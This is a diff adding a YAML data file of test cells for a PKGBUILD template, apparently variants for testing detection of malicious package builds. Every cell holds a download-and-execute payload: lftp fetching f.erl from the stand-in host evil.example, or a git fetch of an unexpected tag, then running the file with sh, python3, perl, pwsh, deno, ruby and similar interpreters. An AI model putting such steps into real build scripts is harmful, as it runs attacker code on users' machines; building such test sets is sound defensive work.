@@ -1,0 +1,290 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        sh f.erl
+  id: 353-lftpc-sh
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zx f.erl
+  id: 354-lftpc-zx
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        guile f.erl
+  id: 355-lftpc-guile
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        racket f.erl
+  id: 356-lftpc-racket
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 357-lftpc-deno
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 358-lftpc-bun
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        elixir f.erl
+  id: 359-lftpc-elixir
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ts-node f.erl
+  id: 360-lftpc-tsnode
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        Rscript < f.erl
+  id: 361-lftpc-rscriptlt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        pwsh < f.erl
+  id: 362-lftpc-pwshlt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        python3 < f.erl
+  id: 363-lftpc-py3lt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        perl < f.erl
+  id: 364-lftpc-perllt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        node < f.erl
+  id: 365-lftpc-nodelt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        tclsh < f.erl
+  id: 366-lftpc-tclshlt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        php < f.erl
+  id: 367-lftpc-phplt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ruby < f.erl
+  id: 368-lftpc-rubylt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lua < f.erl
+  id: 369-lftpc-lualt
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get f.erl; bye" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 371-lftpc-loop
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        sh f.erl
+  id: 372-lftpf-sh
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zx f.erl
+  id: 373-lftpf-zx
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        guile f.erl
+  id: 374-lftpf-guile
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        racket f.erl
+  id: 375-lftpf-racket
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 376-lftpf-deno
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 377-lftpf-bun
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        elixir f.erl
+  id: 378-lftpf-elixir
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ts-node f.erl
+  id: 379-lftpf-tsnode
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        Rscript < f.erl
+  id: 380-lftpf-rscriptlt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        pwsh < f.erl
+  id: 381-lftpf-pwshlt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        python3 < f.erl
+  id: 382-lftpf-py3lt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        perl < f.erl
+  id: 383-lftpf-perllt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        node < f.erl
+  id: 384-lftpf-nodelt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        tclsh < f.erl
+  id: 385-lftpf-tclshlt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        php < f.erl
+  id: 386-lftpf-phplt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ruby < f.erl
+  id: 387-lftpf-rubylt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lua < f.erl
+  id: 388-lftpf-lualt
+- vars:
+    payload: |2
+        lftp -f lftprc.txt "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 390-lftpf-loop
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        sh f.erl
+  id: 391-gitfetch-sh
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        zx f.erl
+  id: 392-gitfetch-zx
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        guile f.erl
+  id: 393-gitfetch-guile
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        racket f.erl
+  id: 394-gitfetch-racket
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        deno f.erl
+  id: 395-gitfetch-deno
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bun f.erl
+  id: 396-gitfetch-bun
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        elixir f.erl
+  id: 397-gitfetch-elixir
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        ts-node f.erl
+  id: 398-gitfetch-tsnode
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        Rscript < f.erl
+  id: 399-gitfetch-rscriptlt
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        pwsh < f.erl
+  id: 400-gitfetch-pwshlt
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        python3 < f.erl
+  id: 401-gitfetch-py3lt
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9 "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        perl < f.erl
+  id: 402-gitfetch-perllt
